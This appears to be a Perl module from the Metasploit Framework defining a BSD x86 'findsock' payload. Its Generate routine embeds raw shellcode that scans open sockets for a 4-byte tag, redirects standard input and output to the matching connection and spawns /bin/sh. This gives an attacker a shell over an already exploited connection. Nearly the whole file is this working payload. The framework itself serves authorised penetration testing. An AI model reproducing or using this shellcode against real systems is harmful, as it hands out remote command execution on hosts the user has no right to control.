
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::bsd_ia32_findrecv;
use strict;
use base 'Msf::PayloadComponent::FindRecvConnection';

my $advanced = 
{
	'FindTag'      => ['msf!', 'Tag sent and checked for by payload'],
};

my $info =
{
	'Name'         => 'BSD IA32 Recv Tag Findsock Shell',
	'Version'      => '$Revision$',
	'Description'  => 'Spawn a shell on the established connection, proxy/nat safe',
	'Authors'      => [ 'skape <mmiller [at] hick.org>', ],
	'Arch'         => [ 'x86' ],
	'Priv'         => 0,
	'OS'           => [ 'bsd' ],
	'Size'         => '',
};

sub new 
{
	my $class = shift;
	my $hash = @_ ? shift : { };
	$hash = $class->MergeHash($hash, {'Info' => $info, 'Advanced' => $advanced});
	my $self = $class->SUPER::new($hash, @_);

	$self->_Info->{'Size'} = $self->_GenSize;
	return($self);
}

sub Build 
{
	my $self = shift;
	return($self->Generate);
}

sub Generate 
{
	my $self = shift;

	# Get tag and make sure its 4 bytes (pad/truncate)
	my $tag = substr($self->GetLocal('FindTag') . ("\x01" x 4), 0, 4);

	my $shellcode =
		"\x31\xd2\x52\x89\xe6\x52\x52\xb2\x80\x52\xb6\x0c\x52\x56\x52\x52" .
		"\x66\xff\x46\xe8\x6a\x1d\x58\xcd\x80\x81\x3e\x6d\x73\x66\x21\x75" .
		"\xef\x5a\x5f\x6a\x02\x59\x6a\x5a\x58\x51\x57\x51\xcd\x80\x49\x79" .
		"\xf5\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54" .
		"\x53\x53\xb0\x3b\xcd\x80";

	substr($shellcode, 0x1b, 4, $tag);

	return($shellcode);
}

sub _GenSize 
{
	my $self = shift;
	my $bin = $self->Generate;
	return(length($bin));
}

1;
